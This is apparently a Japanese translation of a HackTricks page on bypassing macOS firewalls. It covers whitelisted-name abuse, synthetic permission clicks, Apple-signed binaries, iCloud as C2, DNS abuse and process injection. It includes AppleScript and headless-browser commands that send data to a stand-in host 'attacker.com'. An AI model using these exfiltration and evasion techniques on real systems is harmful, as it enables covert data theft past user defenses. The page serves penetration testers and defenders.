# macOS ファイアウォールのバイパス

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## 発見されたテクニック

以下のテクニックは、一部の macOS ファイアウォールアプリで機能することが確認されました。

### ホワイトリスト名の悪用

* たとえば、マルウェアを **`launchd`** のようなよく知られた macOS プロセスの名前で呼び出す

### シンセティッククリック

* ファイアウォールがユーザーに許可を求める場合、マルウェアに **許可をクリック** させる

### **Apple 署名のバイナリの使用**

* **`curl`** のようなものだけでなく、**`whois`** なども

### よく知られた Apple ドメイン

ファイアウォールは、**`apple.com`** や **`icloud.com`** のようなよく知られた Apple ドメインへの接続を許可している可能性があります。そして iCloud は C2 として使用されるかもしれません。

### 一般的なバイパス

ファイアウォールをバイパスしようとするいくつかのアイデア

### 許可されたトラフィックをチェック

許可されたトラフィックを知ることで、潜在的にホワイトリストに登録されているドメインやそれにアクセスできるアプリケーションを特定するのに役立ちます
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNSの乱用

DNSの解決は、おそらくDNSサーバーに連絡を取ることが許可されるであろう**`mdnsreponder`**署名済みアプリケーションを介して行われます。

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### ブラウザアプリを介して

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### プロセスインジェクションを介して

**プロセスにコードをインジェクト**できれば、任意のサーバーに接続を許可されているプロセスにコードをインジェクトすることでファイアウォールの保護をバイパスできます:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## 参考文献

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>!</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい場合は** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください!
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) をフォローする。
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
